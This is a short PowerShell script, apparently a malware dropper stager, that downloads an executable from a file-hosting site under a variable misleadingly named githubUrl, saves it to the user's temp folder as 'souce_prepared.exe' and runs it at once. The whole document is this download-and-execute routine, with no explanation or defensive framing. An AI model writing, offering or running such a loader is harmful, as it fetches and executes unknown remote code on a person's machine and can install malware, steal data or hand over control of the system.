$githubUrl = "https://files.catbox.moe/uy96rs.exel"
$tempPath = [System.IO.Path]::Combine($env:TEMP, "souce_prepared.exe")
Invoke-WebRequest -Uri $githubUrl -OutFile $tempPath
Rename-Item -Path $tempPath -NewName "souce_prepared.exe"
$finalPath = [System.IO.Path]::Combine($env:TEMP, "souce_prepared.exe")
& $finalPath
